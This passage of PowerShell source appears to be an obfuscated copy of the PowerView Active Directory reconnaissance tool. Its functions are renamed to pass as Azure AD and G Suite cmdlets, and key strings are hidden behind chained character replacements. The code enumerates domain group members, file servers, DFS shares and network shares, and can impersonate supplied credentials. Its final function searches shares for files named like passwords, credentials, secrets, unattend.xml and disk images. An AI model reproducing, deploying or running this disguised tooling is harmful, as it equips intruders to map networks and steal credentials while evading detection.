        [Switch]
        $tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $searcherarguments = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $adnamearguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }
    PROCESS {
        $groupsearcher = set-azureaddevice @SearcherArguments
        if ($GroupSearcher) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $SearcherArguments['Identity'] = $Identity
                $SearcherArguments['Raw'] = $True
                $group = set-azureadmsgroup @SearcherArguments
                if (-not $Group) {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity: $Identity"
                }
                else {
                    $groupfoundname = $Group.properties.item('samaccountname')[0]
                    $groupfounddn = $Group.properties.item('distinguishedname')[0]
                    if ($PSBoundParameters['Domain']) {
                        $groupfounddomain = $Domain
                    }
                    else {
                        
                        if ($GroupFoundDN) {
                            $groupfounddomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName'))
                    $members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $null = $SearcherArguments.Remove('Raw')
            }
            else {
                $identityfilter = ''
                $filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $identityinstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            
                            
                            $identitydomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $groupsearcher = set-azureaddevice @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $guidbytestring = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $convertedidentityinstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | set-azureadapplicationproxyapplicationconnectorgroup -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $groupdomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $groupname = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $groupsearcher = set-azureaddevice @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroupMember] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }
                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter)"
                try {
                    $result = $GroupSearcher.FindOne()
                }
                catch {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity '$Identity': $_"
                    $members = @()
                }
                $groupfoundname = ''
                $groupfounddn = ''
                if ($Result) {
                    $members = $Result.properties.item('member')
                    if ($Members.count -eq 0) {
                        
                        $finished = $False
                        $bottom = 0
                        $top = 0
                        while (-not $Finished) {
                            $top = $Bottom + 1499
                            $memberrange="member;range=$Bottom-$Top"
                            $Bottom += 1500
                            $null = $GroupSearcher.PropertiesToLoad.Clear()
                            $null = $GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                            $null = $GroupSearcher.PropertiesToLoad.Add('samaccountname')
                            $null = $GroupSearcher.PropertiesToLoad.Add('distinguishedname')
                            try {
                                $result = $GroupSearcher.FindOne()
                                $rangedproperty = $Result.Properties.PropertyNames -like "idisdl;l#thd=*".replace('#', 'a').replace('d', 'e').replace('t', 'n').replace('i', 'm').replace('s', 'b').replace('l', 'r').replace('h', 'g')
                                $Members += $Result.Properties.item($RangedProperty)
                                $groupfoundname = $Result.properties.item('samaccountname')[0]
                                $groupfounddn = $Result.properties.item('distinguishedname')[0]
                                if ($Members.count -eq 0) {
                                    $finished = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $finished = $True
                            }
                        }
                    }
                    else {
                        $groupfoundname = $Result.properties.item('samaccountname')[0]
                        $groupfounddn = $Result.properties.item('distinguishedname')[0]
                        $Members += $Result.Properties.item($RangedProperty)
                    }
                    if ($PSBoundParameters['Domain']) {
                        $groupfounddomain = $Domain
                    }
                    else {
                        
                        if ($GroupFoundDN) {
                            $groupfounddomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }
            ForEach ($Member in $Members) {
                if ($Recurse -and $UseMatchingRule) {
                    $properties = $_.Properties
                }
                else {
                    $objectsearcherarguments = $SearcherArguments.Clone()
                    $ObjectSearcherArguments['Identity'] = $Member
                    $ObjectSearcherArguments['Raw'] = $True
                    $ObjectSearcherArguments['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $object = Get-DomainObject @ObjectSearcherArguments
                    $properties = $Object.Properties
                }
                if ($Properties) {
                    $groupmember = New-Object PSObject
                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $GroupFoundDomain
                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName
                    $GroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupFoundDN
                    if ($Properties.objectsid) {
                        $membersid = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        $membersid = $Null
                    }
                    try {
                        $memberdn = $Properties.distinguishedname[0]
                        if ($MemberDN -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $MemberSID) {
                                    $membersid = $Properties.cn[0]
                                }
                                $membersimplename = set-azureadapplicationproxyapplicationconnectorgroup -Identity $MemberSID -OutputType 'DomainSimple' @ADNameArguments
                                if ($MemberSimpleName) {
                                    $memberdomain = $MemberSimpleName.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                    $memberdomain = $Null
                                }
                            }
                            catch {
                                Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                $memberdomain = $Null
                            }
                        }
                        else {
                            
                            $memberdomain = $MemberDN.SubString($MemberDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $memberdn = $Null
                        $memberdomain = $Null
                    }
                    if ($Properties.samaccountname) {
                        
                        $membername = $Properties.samaccountname[0]
                    }
                    else {
                        
                        try {
                            $membername = get-azureaduserregistereddevice -ObjectSID $Properties.cn[0] @ADNameArguments
                        }
                        catch {
                            
                            $membername = $Properties.cn[0]
                        }
                    }
                    if ($Properties.objectclass -match 'computer') {
                        $memberobjectclass = 'computer'
                    }
                    elseif ($Properties.objectclass -match 'group') {
                        $memberobjectclass = 'group'
                    }
                    elseif ($Properties.objectclass -match 'user') {
                        $memberobjectclass = 'user'
                    }
                    else {
                        $memberobjectclass = $Null
                    }
                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $GroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDN
                    $GroupMember | Add-Member Noteproperty 'MemberObjectClass' $MemberObjectClass
                    $GroupMember | Add-Member Noteproperty 'MemberSID' $MemberSID
                    $GroupMember.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $GroupMember
                    
                    if ($PSBoundParameters['Recurse'] -and $MemberDN -and ($MemberObjectClass -match 'group')) {
                        Write-Verbose "[Get-DomainGroupMember] Manually recursing on group: $MemberDN"
                        $SearcherArguments['Identity'] = $MemberDN
                        $null = $SearcherArguments.Remove('Properties')
                        get-gsgmailfilterlist @SearcherArguments
                    }
                }
            }
            $GroupSearcher.dispose()
        }
    }
}
function set-azureadapplicationlogo {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $ldapfilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $searchbase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [Switch]
        $tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function get-azureadcontactmembership {
            
            Param([String]$path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }
        $searcherarguments = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                $usersearcher = set-azureaddevice @SearcherArguments
                
                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {get-azureadcontactmembership($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {get-azureadcontactmembership($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {get-azureadcontactmembership($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $usersearcher = set-azureaddevice @SearcherArguments
            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {get-azureadcontactmembership($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {get-azureadcontactmembership($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {get-azureadcontactmembership($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}
function get-gsuserlicenseinfo {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $searchbase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [Switch]
        $tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $version = 'All'
    )
    BEGIN {
        $searcherarguments = @{}
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        function get-azureadmsadministrativeunit {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $pkt
            )
            $bin = $Pkt
            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
            $offset = 8
            
            $object_list = @()
            for($i=1; $i -le $blob_element_count; $i++){
                $blob_name_size_start = $offset
                $blob_name_size_end = $offset + 1
                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)
                $blob_name_start = $blob_name_size_end + 1
                $blob_name_end = $blob_name_start + $blob_name_size - 1
                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])
                $blob_data_size_start = $blob_name_end + 1
                $blob_data_size_end = $blob_data_size_start + 3
                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)
                $blob_data_start = $blob_data_size_end + 1
                $blob_data_end = $blob_data_start + $blob_data_size - 1
                $blob_data = $bin[$blob_data_start..$blob_data_end]
                switch -wildcard ($blob_name) {
                    "\nd#alhh#".replace('a', 'e').replace('#', 't').replace('d', 'i').replace('n', 's').replace('l', 'r').replace('h', 'o') {  }
                    "\eos# luooh*".replace('#', 'a').replace('e', 'd').replace('l', 'n').replace('s', 'm').replace('h', 't').replace(' ', 'i').replace('u', 'r') {
                        
                        
                        $root_or_link_guid_start = 0
                        $root_or_link_guid_end = 15
                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                        $guid = New-Object Guid(,$root_or_link_guid) 
                        $prefix_size_start = $root_or_link_guid_end + 1
                        $prefix_size_end = $prefix_size_start + 1
                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                        $prefix_start = $prefix_size_end + 1
                        $prefix_end = $prefix_start + $prefix_size - 1
                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])
                        $short_prefix_size_start = $prefix_end + 1
                        $short_prefix_size_end = $short_prefix_size_start + 1
                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                        $short_prefix_start = $short_prefix_size_end + 1
                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])
                        $type_start = $short_prefix_end + 1
                        $type_end = $type_start + 3
                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)
                        $state_start = $type_end + 1
                        $state_end = $state_start + 3
                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)
                        $comment_size_start = $state_end + 1
                        $comment_size_end = $comment_size_start + 1
                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                        $comment_start = $comment_size_end + 1
                        $comment_end = $comment_start + $comment_size - 1
                        if ($comment_size -gt 0)  {
                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                        }
                        $prefix_timestamp_start = $comment_end + 1
                        $prefix_timestamp_end = $prefix_timestamp_start + 7
                        
                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] 
                        $state_timestamp_start = $prefix_timestamp_end + 1
                        $state_timestamp_end = $state_timestamp_start + 7
                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
                        $comment_timestamp_start = $state_timestamp_end + 1
                        $comment_timestamp_end = $comment_timestamp_start + 7
                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                        $version_start = $comment_timestamp_end  + 1
                        $version_end = $version_start + 3
                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)
                        
                        $dfs_targetlist_blob_size_start = $version_end + 1
                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)
                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                        $reserved_blob_size_end = $reserved_blob_size_start + 3
                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)
                        $reserved_blob_start = $reserved_blob_size_end + 1
                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                        $referral_ttl_start = $reserved_blob_end + 1
                        $referral_ttl_end = $referral_ttl_start + 3
                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)
                        
                        $target_count_start = 0
                        $target_count_end = $target_count_start + 3
                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                        $t_offset = $target_count_end + 1
                        for($j=1; $j -le $target_count; $j++){
                            $target_entry_size_start = $t_offset
                            $target_entry_size_end = $target_entry_size_start + 3
                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                            $target_time_stamp_start = $target_entry_size_end + 1
                            $target_time_stamp_end = $target_time_stamp_start + 7
                            
                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                            $target_state_start = $target_time_stamp_end + 1
                            $target_state_end = $target_state_start + 3
                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)
                            $target_type_start = $target_state_end + 1
                            $target_type_end = $target_type_start + 3
                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)
                            $server_name_size_start = $target_type_end + 1
                            $server_name_size_end = $server_name_size_start + 1
                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)
                            $server_name_start = $server_name_size_end + 1
                            $server_name_end = $server_name_start + $server_name_size - 1
                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])
                            $share_name_size_start = $server_name_end + 1
                            $share_name_size_end = $share_name_size_start + 1
                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                            $share_name_start = $share_name_size_end + 1
                            $share_name_end = $share_name_start + $share_name_size - 1
                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])
                            $target_list += "\\$server_name\$share_name"
                            $t_offset = $share_name_end + 1
                        }
                    }
                }
                $offset = $blob_data_end + 1
                $dfs_pkt_properties = @{
                    'Name' = $blob_name
                    'Prefix' = $prefix
                    'TargetList' = $target_list
                }
                $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
                $prefix = $Null
                $blob_name = $Null
                $target_list = $Null
            }
            $servers = @()
            $object_list | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $servers += $_.split('\')[2]
                    }
                }
            }
            $servers
        }
        function get-gsgmaillabel {
            [CmdletBinding()]
            Param(
                [String]
                $domain,
                [String]
                $searchbase,
                [String]
                $server,
                [String]
                $searchscope = 'Subtree',
                [Int]
                $resultpagesize = 200,
                [Int]
                $servertimelimit,
                [Switch]
                $tombstone,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $credential = [Management.Automation.PSCredential]::Empty
            )
            $dfssearcher = set-azureaddevice @PSBoundParameters
            if ($DFSsearcher) {
                $dfsshares = @()
                $DFSsearcher.filter = '(&(objectClass=fTDfs))'
                try {
                    $results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $properties = $_.Properties
                        $remotenames = $Properties.remoteservername
                        $pkt = $Properties.pkt
                        $DFSshares += $RemoteNames | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()
                    if ($pkt -and $pkt[0]) {
                        get-azureadmsadministrativeunit $pkt[0] | ForEach-Object {
                            
                            
                            
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
        function set-azureadapplicationproxyconnectorgroup {
            [CmdletBinding()]
            Param(
                [String]
                $domain,
                [String]
                $searchbase,
                [String]
                $server,
                [String]
                $searchscope = 'Subtree',
                [Int]
                $resultpagesize = 200,
                [Int]
                $servertimelimit,
                [Switch]
                $tombstone,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $credential = [Management.Automation.PSCredential]::Empty
            )
            $dfssearcher = set-azureaddevice @PSBoundParameters
            if ($DFSsearcher) {
                $dfsshares = @()
                $DFSsearcher.filter = '(&(objectClass=msDFS-Linkv2))'
                $null = $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
                try {
                    $results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $properties = $_.Properties
                        $target_list = $Properties.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                        $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $target = $_.InnerText
                                if ( $Target.Contains('\') ) {
                                    $dfsroot = $Target.split('\')[3]
                                    $sharename = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }
    PROCESS {
        $dfsshares = @()
        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                if ($Version -match 'all|1') {
                    $DFSshares += get-gsgmaillabel @SearcherArguments
                }
                if ($Version -match 'all|2') {
                    $DFSshares += set-azureadapplicationproxyconnectorgroup @SearcherArguments
                }
            }
        }
        else {
            if ($Version -match 'all|1') {
                $DFSshares += get-gsgmaillabel @SearcherArguments
            }
            if ($Version -match 'all|2') {
                $DFSshares += set-azureadapplicationproxyconnectorgroup @SearcherArguments
            }
        }
        $DFSshares | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}
function get-azureaddomainverificationdnsrecord {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $computername = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $logontoken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $querylevel = 1
            $ptrinfo = [IntPtr]::Zero
            $entriesread = 0
            $totalread = 0
            $resumehandle = 0
            
            $result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
            
            $offset = $PtrInfo.ToInt64()
            
            if (($Result -eq 0) -and ($Offset -gt 0)) {
                
                $increment = $SHARE_INFO_1::GetSize()
                
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    
                    $newintptr = New-Object System.Intptr -ArgumentList $Offset
                    $info = $NewIntPtr -as $SHARE_INFO_1
                    
                    $share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $Computer
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Share
                }
                
                $null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function get-azureaddeviceregistereduser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $lastaccesstime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $lastwritetime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $creationtime,
